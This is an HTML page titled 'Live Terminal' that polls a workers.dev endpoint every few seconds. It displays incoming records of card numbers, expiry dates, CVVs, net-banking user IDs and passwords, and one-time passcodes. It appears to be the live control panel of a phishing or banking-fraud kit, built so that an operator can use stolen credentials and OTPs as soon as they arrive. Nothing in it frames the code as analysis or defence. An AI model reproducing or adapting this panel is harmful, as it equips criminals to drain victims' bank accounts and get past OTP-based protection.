<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Terminal</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background-color: #f4f4f4; padding: 10px; }

        header { 
            display: flex; 
            justify-content: space-between; 
            align-items: center;
            padding: 10px;
            background: #fff;
            border-radius: 8px;
            margin-bottom: 15px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
        }

        #count { font-family: 'Orbitron', sans-serif; font-size: 22px; color: #000; }
        .live { color: red; font-size: 10px; font-weight: bold; text-transform: uppercase; animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0; } }

        #container { max-width: 500px; margin: 0 auto; }

        .card {
            background: #fff;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 12px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.06);
            border-left: 4px solid #000;
        }

        .row { margin-bottom: 8px; border-bottom: 1px solid #f9f9f9; padding-bottom: 4px; }
        .lbl { font-size: 15px; color: #999; text-transform: uppercase; font-weight: bold; }
        .val { font-size: 15px; color: #111; font-weight: 600; word-break: break-all; }
        .otp { font-size: 20px; color: #1e7e34; font-family: 'Orbitron', sans-serif; }

        .time { font-size: 9px; color: #ccc; text-align: right; margin-top: 5px; }
    </style>
</head>
<body>

    <header>
        <span class="live">● LIVE</span>
        <div id="count">00</div>
    </header>

    <div id="container"></div>

    <script>
        const workerURL = 'https://fancy-tree-0129.sumankkuuyy.workers.dev/';

        async function update() {
            try {
                const res = await fetch(workerURL);
                const data = await res.json();
                
                document.getElementById('count').innerText = data.length.toString().padStart(2, '0');
                const container = document.getElementById('container');
                container.innerHTML = ''; 

                data.forEach(e => {
                    let html = "";

                    // Card Info
                    if (e.card_no) {
                        html += `<div class="row"><span class="lbl">Card</span><div class="val">${e.card_no}</div><div class="val" style="font-size:12px;">${e.card_exp || '--'} | ${e.card_cvv || '--'}</div></div>`;
                    }

                    // Net Banking
                    if (e.user_id || e.password) {
                        html += `<div class="row"><span class="lbl">Auth [${e.bank || 'Bank'}]</span><div class="val">U: ${e.user_id || '-'}</div><div class="val">P: ${e.password || '-'}</div></div>`;
                    }

                    // OTPs
                    if (e.otp_1 || e.otp_2 || e.otp_3) {
                        html += `<div class="row"><span class="lbl">OTPs</span>`;
                        if (e.otp_1) html += `<div class="otp">${e.otp_1}</div>`;
                        if (e.otp_2) html += `<div class="otp">${e.otp_2}</div>`;
                        if (e.otp_3) html += `<div class="otp">${e.otp_3}</div>`;
                        html += `</div>`;
                    }

                    if (html !== "") {
                        const div = document.createElement('div');
                        div.className = 'card';
                        div.innerHTML = html + `<div class="time">${e.time || ''}</div>`;
                        container.appendChild(div);
                    }
                });
            } catch (err) {}
        }

        setInterval(update, 2500);
        update();
    </script>
</body>
</html>
